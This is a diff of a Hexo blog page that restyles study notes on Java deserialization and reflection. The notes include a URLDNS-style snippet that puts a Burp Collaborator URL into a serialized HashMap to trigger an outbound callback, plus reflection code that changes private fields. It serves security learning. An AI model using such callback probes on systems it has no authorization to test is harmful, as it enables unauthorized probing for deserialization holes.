@@ -77,11 +77,6 @@
 <link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
 
 
   
@@ -89,13 +84,21 @@
 <link rel="stylesheet" href="/css/cloudedGlass.css">
 <link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
 <link rel="stylesheet" href="/css/Loadanimation.css">
+<link rel="stylesheet" href="/css/StrongInDark.css">
+<link rel="stylesheet" href="/css/TitleNeon.css">
+<link rel="stylesheet" href="/css/TitleGradient.css">
+<link rel="stylesheet" href="/css/ScrollBar.css">
+<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
+<link rel="stylesheet" href="/css/CodeBlock.css">
+<link rel="stylesheet" href="/css/CodeInLine.css">
+<link rel="stylesheet" href="/css/Background.css">
 
 
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -123,11 +126,43 @@
   
   <script src="/js/backgroundize.js"></script>
   <script src="/js/injector.js"></script>
-<meta name="generator" content="Hexo 7.3.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
+    <style>
+    .code-expand-btn:not(.expand-done) ~ div.codeblock,
+    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
+      overflow: hidden;
+      height: 360px;
+    }
+    </style>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 
-<body>
-  
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  <div id="loader-container"> 
+    <div id="loader" class="loader"></div>
+    <div class="loader-inner">
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/js/RainbowLoading.js" type="text/javascript"></script>
+<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>
 
   <header>
     
@@ -136,7 +171,7 @@
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
-      <strong> 🐽🐽 Piggy Sprint &#39;s blog</strong>
+      <strong class="navbar-title"> 🐽🐽 Piggy Sprint &#39;s blog</strong>
     </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
@@ -272,7 +307,7 @@
         
         
         
-          16 分钟
+          15 分钟
         
       </span>
     
@@ -326,7 +361,13 @@
                 <h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="引出"><a href="#引出" class="headerlink" title="引出"></a>引出</h2><p>按照上面的HashMapper进行测试</p>
 <ul>
 <li><p>先写HashMapper传入&lt;url , integer&gt;,传入url会继承Serializable 接口（所以可能存在反序列化触发点）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>    HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>    hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// System.out.println(person);</span><br>    serialize(hashmap);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> person </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Person</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;aa&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">22</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// System.out.println(person);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
 
 <p>测试发现可以序列化（服务端出现请求），但是反序列化没有输出</p>
 <p><code>不序列化也可以出现请求</code></p>
@@ -374,11 +415,43 @@
 <li>通过Class类创建对象，引入不能序列化的类</li>
 </ul>
 <h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>Person类：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 假设存在Person类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;name=&#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;, age=&quot;</span> + age + <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 假设存在Person类</span></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> age</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> Person</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> Person</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">age</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> name;</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">age</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> age;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> toString</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Person{name=&#39;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> name </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&#39;, age=&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> age </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;}&#39;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
 
 <p>实现：（就是利用class方法，从原型class里面实例化对象）</p>
 <h4 id="从原型class里面实例化对象"><a href="#从原型class里面实例化对象" class="headerlink" title="从原型class里面实例化对象"></a><strong>从原型class里面实例化对象</strong></h4><p>c.newInstance();</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>        <span class="hljs-comment">//反射就是操作Class</span><br><br>        <span class="hljs-comment">//从原型class里面实例化对象</span><br>        <span class="hljs-comment">//c.newInstance();</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;abc&quot;</span>, <span class="hljs-number">22</span>);<br>        System.out.println(p);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Constructor</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Method</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ReflectionTest</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">person</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Person</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">person</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//反射就是操作Class</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//从原型class里面实例化对象</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//c.newInstance();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">personconstructor</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">int</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Person) </span><span style="color: #E5C07B">personconstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;abc&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">22</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(p);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
 
 <p>解析：</p>
 <ul>
@@ -390,7 +463,11 @@
 <h4 id="获取类里面属性"><a href="#获取类里面属性" class="headerlink" title="**获取类里面属性 **"></a>**获取类里面属性 **</h4><ol>
 <li><p>c.getFields()（是class的一个getFields()方法，返回一个 <code>Field</code> 数组）‘</p>
 <p>​	<strong>注意：</strong>getFields()，返回的数组是每个 <code>Field</code> 对象对应类中的一个<strong>公共字段</strong>（被 <code>public</code> 修饰的字段）<br>**c.getDeclaredFields()**可以返回private</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取类里面属性</span><br>Field[] personfields = c.getFields();<br><span class="hljs-keyword">for</span>(Field f:personfields)&#123;<br>    System.out.println(f);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//获取类里面属性</span></span>
+<span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75">[] personfields </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getFields</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> f</span><span style="color: #C678DD">:</span><span style="color: #E06C75">personfields){</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(f);</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
 
 <p>解析：</p>
 <ul>
@@ -402,7 +479,8 @@
 <p>输出：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112200428456.png" srcset="/img/loading.gif" lazyload alt="image-20251112200428428"></p>
 <p>但是，此处的int类型的age没有打印出来<br><strong>原因：</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String name;<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> age</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
 
 <p>name是public，age是private</p>
 </li>
@@ -410,38 +488,55 @@
 <p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112200939690.png" srcset="/img/loading.gif" lazyload alt="image-20251112200939655"></p>
 </li>
 <li><p>只传特定值（改变值）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">namefield</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>namefield.set(p,<span class="hljs-string">&quot;saffs&quot;</span>);<br>System.out.println(p);<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> namefield </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;name&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">namefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(p,</span><span style="color: #98C379">&quot;saffs&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(p);</span></span></code></pre></div></div></figure>
 
 <p>把上面的p（先前使用c.newInstance()的输出）的name属性改为<code>saffs</code></p>
 <p>输出：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112220911373.png" srcset="/img/loading.gif" lazyload alt="image-20251112220911332"></p>
 <p><strong>getField也是私有的<code>private</code>不能修改</strong></p>
 <p><strong>c.getDeclaredFields()     namefield.setAccessible(true);即可</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">namefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>namefield.setAccessible(<span class="hljs-literal">true</span>);<br>namefield.set(p,<span class="hljs-number">25</span>);<br>System.out.println(p);<br></code></pre></td></tr></table></figure>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> namefield </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;age&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">namefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">namefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(p,</span><span style="color: #D19A66">25</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(p);</span></span></code></pre></div></div></figure>
 
 <p>改成这样就有权限了</p>
 </li>
 </ol>
